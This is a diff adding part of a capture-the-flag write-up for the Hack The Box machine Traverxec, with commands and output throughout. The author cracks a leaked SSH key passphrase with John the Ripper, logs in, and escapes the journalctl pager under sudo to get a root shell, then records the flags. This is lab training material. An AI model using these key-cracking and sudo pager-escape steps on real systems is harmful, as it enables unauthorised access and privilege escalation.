@@ -286,8 +286,245 @@ as are `.ssh/id_dsa` and `.ssh/id_rsa`
 
 we're not getting prompted for auth, or seeing 403s
 
+the last line from the `HOMEDIRS` documentation missing from above is
+```
+     You can restrict the access within the home directories to a single sub
+     directory by defining it via the homedirs_public option.
+```
+
+so what we're seeing is not `/home/david`, it's `/home/david/public_www`
+
+path traversal? no, we don't have a param, only the URI.
+
+```
+ls /home/david/public_www/
+index.html
+protected-file-area
+```
+
+ok - and that gives us an auth prompt
+
+and [backup-ssh-identity-files.tgz](backup-ssh-identity-files.tgz), which.. is going to have a key.
+
+```
+Path = backup-ssh-identity-files.tar
+Type = tar
+Physical Size = 10240
+Headers Size = 7168
+Code Page = UTF-8
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2019-10-25 15:02:50 D....            0            0  home/david/.ssh
+2019-10-25 15:02:50 .....          397          512  home/david/.ssh/authorized_keys
+2019-10-25 15:02:21 .....         1766         2048  home/david/.ssh/id_rsa
+2019-10-25 15:02:44 .....          397          512  home/david/.ssh/id_rsa.pub
+------------------- ----- ------------ ------------  ------------------------
+```
+
+indeed it is.
+
+```
+$ ssh -i home/david/.ssh/id_rsa -l david traverxec.htb
+Warning: Permanently added 'traverxec.htb,10.10.10.165' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'home/david/.ssh/id_rsa':
+```
+
+ok, more john first.
+
+```
+$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa > david_rsa.hash
+$ john_rockyou david_rsa.hash
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (home/david/.ssh/id_rsa)
+1g 0:00:00:00 DONE (2022-07-22 16:42) 25.00g/s 6400p/s 6400c/s 6400C/s carolina..freedom
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+real    0m3.154s
+user    0m27.617s
+sys     0m0.136s
+```
+
+i'll allow it.
+
+```
+$ ssh -i home/david/.ssh/id_rsa -l david traverxec.htb
+Warning: Permanently added 'traverxec.htb,10.10.10.165' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'home/david/.ssh/id_rsa':
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+david@traverxec:~$ cat user.txt
+7db0b48469606a42cec20750d9782f3d
+```
+
+nice.
+
+### pivot
+
+```
+david@traverxec:~$ crontab -l
+no crontab for david
+david@traverxec:~$ sudo -l
+[sudo] password for david:
+Sorry, try again.
+[sudo] password for david:
+Sorry, try again.
+[sudo] password for david:
+sudo: 2 incorrect password attempts
+```
+
+password is not `Nowonly4me` or `hunter`, moving on
+
+```
+david@traverxec:~$ ls -l /opt
+total 0
+david@traverxec:~$ ls -l /tmp
+total 12
+drwx------ 3 root root 4096 Jul 22 18:37 systemd-private-b11fbee206fd4cdab1940344c9ddf71e-systemd-timesyncd.service-xmgukP
+drwx------ 2 root root 4096 Jul 22 18:37 vmware-root
+drwx------ 2 root root 4096 Jul 22 18:37 vmware-root_622-2689275054
+david@traverxec:~$ ls -l /mnt
+total 0
+```
+
+linpeas it is
+
+```
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
+/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+New path exported: /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
+
+...
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
+ptrace protection is disabled (0)
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+
+...
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+You own the script: /home/david/bin/server-stats.sh
+/usr/bin/gettext.sh
+
+```
+
+ok, so `server-stats.sh` looks like the way forward
+
+```
+david@traverxec:~$ ls -l bin/
+total 8
+-r-------- 1 david david 802 Oct 25  2019 server-stats.head
+-rwx------ 1 david david 363 Oct 25  2019 server-stats.sh
+david@traverxec:~$ cat bin/server-stats.head
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""'
+
+david@traverxec:~$ cat bin/server-stats.sh
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+
+unclear when it runs, and that `sudo` has to mean we have NOPASSWD access to at least `journalctl`
+
+```
+david@traverxec:~$ bash bin/server-stats.sh
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""'
+
+Load:  18:56:30 up 19 min,  1 user,  load average: 0.00, 0.01, 0.00
+
+Open nhttpd sockets: 0
+Files in the docroot: 117
+
+Last 5 journal log lines:
+-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:56:30 EDT. --
+Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
+Jul 22 18:37:18 traverxec nhttpd[438]: started
+Jul 22 18:37:18 traverxec nhttpd[438]: max. file descriptors = 1040 (cur) / 1040 (max)
+Jul 22 18:37:18 traverxec systemd[1]: Started nostromo nhttpd server.
+
+```
+
+confirmed
+
+and gtfobins [https://gtfobins.github.io/gtfobins/journalctl/](https://gtfobins.github.io/gtfobins/journalctl/) says
+
+`sudo journalctl`
+`!/bin/sh`
+
+but
+```
+david@traverxec:~$ sudo journalctl
+[sudo] password for david:
+david@traverxec:~$ sudo /usr/bin/journalctl
+[sudo] password for david:
+david@traverxec:~$
+david@traverxec:~$ sudo /usr/bin/journalctl -n5
+[sudo] password for david:
+david@traverxec:~$ sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:58:20 EDT. --
+Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
+Jul 22 18:37:18 traverxec nhttpd[438]: started
+Jul 22 18:37:18 traverxec nhttpd[438]: max. file descriptors = 1040 (cur) / 1040 (max)
+Jul 22 18:37:18 traverxec systemd[1]: Started nostromo nhttpd server.
+```
+
+the sudo entry is very targeted
+
+but..
+
+> This invokes the default pager, which is likely to be less, other functions may apply.
+
+so, make the window very small, and then
+```
+david@traverxec:~$ sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Fri 2022-07-22 18:37:16 EDT, end at Fri 2022-07-22 18:59:25 EDT. --
+Jul 22 18:37:18 traverxec systemd[1]: Starting nostromo nhttpd server...
+!/bin/sh
+# id -a
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+9aa36a6d76f785dfd320a478f6e0d906
+```
+
+root down.
+
 ## flag
 ```
-user:
-root:
+user:7db0b48469606a42cec20750d9782f3d
+root:9aa36a6d76f785dfd320a478f6e0d906
 ```
